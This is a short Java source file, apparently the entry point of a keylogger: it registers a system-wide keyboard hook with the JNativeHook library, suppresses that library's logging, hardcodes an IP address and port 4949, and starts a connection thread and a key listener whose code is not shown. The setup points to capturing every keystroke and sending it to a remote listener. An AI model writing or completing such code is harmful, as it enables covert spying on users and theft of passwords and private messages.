package me.freeze;

import java.util.logging.Level;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;

public class Main{
	
	static String IP_ADDRESS = "0.0.0.0";
	static int PORT = 4949;

	public static void main(String[]args) {

		java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
		logger.setLevel(Level.WARNING);
		logger.setUseParentHandlers(false);

		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {
//			logger.error(e.getMessage(), e);
			System.exit(-1);
		}
		new KeepC().start();
		GlobalScreen.addNativeKeyListener(new KL());
	}
	
}
